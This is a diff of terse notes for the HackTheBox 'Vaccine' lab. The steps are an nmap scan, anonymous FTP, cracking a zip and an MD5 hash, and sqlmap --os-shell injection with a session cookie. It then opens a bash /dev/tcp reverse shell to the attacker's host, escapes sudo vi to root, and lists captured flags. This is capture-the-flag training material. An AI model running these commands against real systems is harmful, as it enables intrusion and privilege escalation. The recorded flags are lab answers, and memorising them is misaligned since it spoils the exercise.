@@ -367,13 +367,13 @@ af13b0bee69f8a877c3faf667f7beacf
 # Vaccine
 HackTheBox Vaccine Walkthrough
 cd ~/Public
-10.129.254.156
-nmap -F -sV -sC 10.129.254.156
+10.129.145.57
+nmap -F -sV -sC 10.129.145.57
 ftp
 anonymous
 backup.zip
 
-ftp -p anonymous@10.129.254.156
+ftp -p anonymous@10.129.145.57
 get backup.zip
 unzip backup.zip
 zip2john backup.zip > backup.hash
@@ -399,23 +399,30 @@ gunzip rockyou.txt.gz
 741852963
 unzip backup.zip
 head index.php
-rainbow
+https://crackstation.net/
 2cb42f8734ea607eefed3b70af13bbd3  qwerty789
 
 admin / qwerty789
 
-http://10.129.254.156/dashboard.php?search=a
+http://10.129.145.57/dashboard.php?search=a
 
-sqlmap -u 'http://10.129.254.156/dashboard.php?search=a' --cookie='PHPSESSID=tcer626cqoumebdilfbbib1l57'
-
-sqlmap.py -u 'http://10.129.254.156/dashboard.php?search=a' --cookie='PHPSESSID=ojq8sk0069d5h4uq96qr93c063' --os-shell
+sqlmap -u 'http://10.129.145.57/dashboard.php?search=a' --cookie='PHPSESSID=aftnd3qc8ft5pjp4nmm0emljhb'
+aftnd3qc8ft5pjp4nmm0emljhb
+sudo sqlmap -u "http://10.129.145.57/dashboard.php?search=alpha'" --cookie="PHPSESSID=aftnd3qc8ft5pjp4nmm0emljhb" --os-shell
 
 --os-shell
 
-bash -c 'bash -i >& /dev/tcp/10.129.254.156/4444 0>&1'
+ip a | grep tun0
+bash -c 'bash -i >& /dev/tcp/10.10.16.75/4444 0>&1'
 
 nc -lvnp 4444
-
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+whoami
+cd /var/www/html
+cat dashboard.php | grep password
+P@s5w0rd!
+ssh postgres@10.129.145.57
+sudo -l
 vi
 
 find / -type f -name user.txt 2>/dev/null
@@ -423,7 +430,9 @@ cat /var/lib/postgresql/user.txt
 ec9b13ca4d6229cd5cc1e09980965bf7
 
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
-
+:!/bin/bash
+:shell
+id
 whoami
 cat /root/root.txt
 dd6e058e814260bc70e9bbdef2715849
